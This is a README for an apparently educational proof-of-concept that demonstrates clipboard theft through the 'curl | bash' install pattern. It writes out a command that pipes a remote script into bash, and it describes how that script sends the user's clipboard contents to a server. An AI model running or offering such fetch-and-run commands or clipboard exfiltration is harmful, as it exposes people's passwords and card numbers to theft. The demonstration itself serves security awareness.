# Watch your clipboard


Do you put sensitive data in your clipboard? Like bank passwords or
credit card numbers?

Do you use `curl | bash` pattern to install things on your system?


## Install (on Linux)

Just do all the things from attacker list, and then from yours.

### What would attacker do before

1. `git clone` this repo
2. in repo directory run
   ```
   bundle install
   ```
3. Start `./server`


### What would you do

Just the usual:
```
curl https://raw.githubusercontent.com/wrzasa/watch-your-clipboard/master/run-me.sh | bash`
```

## Watch your clipboard

After you installed and run this use your computer as usually. Copy,
paste, whatever. After some time use

```
./get-clipboards.rb
```
and watch what was sent from your clipboard to the server.

This time it was sent to your own server. Because it's a free lesson.
And you have all the code to see how simple it was. Learn.

## Bottom line

Well... more bla bla here then the actual code in the files... but doing
the proof-of-concept was actually interesting.

